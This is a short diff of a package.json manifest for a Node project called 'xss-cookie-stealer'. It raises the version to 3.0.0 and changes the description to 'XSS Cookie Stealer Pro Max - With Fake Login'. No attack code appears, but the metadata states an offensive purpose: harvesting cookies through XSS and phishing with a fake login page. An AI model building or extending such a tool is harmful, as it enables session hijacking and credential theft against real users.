@@ -1,7 +1,7 @@
 {
   "name": "xss-cookie-stealer",
-  "version": "1.0.0",
-  "description": "XSS Cookie Stealer Server for Render",
+  "version": "3.0.0",
+  "description": "XSS Cookie Stealer Pro Max - With Fake Login",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
